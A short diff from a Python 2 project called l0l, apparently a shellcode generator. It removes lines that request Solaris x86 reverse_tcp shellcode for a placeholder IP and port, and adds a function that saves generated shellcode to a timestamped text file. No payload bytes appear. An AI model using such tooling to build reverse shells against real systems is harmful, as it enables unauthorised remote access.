@@ -6,16 +6,16 @@
 #LICENSE : https://github.com/roissy/l0l/blob/master/LICENSE
 #------------------------------------------------------------------#
 
-from generator import *
+from header import *
 
-i = "255.255.255.255"
-p = "44442"
-
-shellcode = generator( "solarisx86", "reverse_tcp", i, p)
-
-for x in database:
-    db += x.strip().replace('"', "").replace('+', "").strip()
-
-print shellcode
+def TxtFile( shellcode):
+    db = '''#Project : https://github.com/roissy/l0l
+#This file created with l0l ..
+#{0} - {1}
 
 
+{2}
+ 
+'''.format(strftime("%d/%m/%Y"), strftime("%H:%M:%S"), shellcode)
+
+    logs( db, "txt")
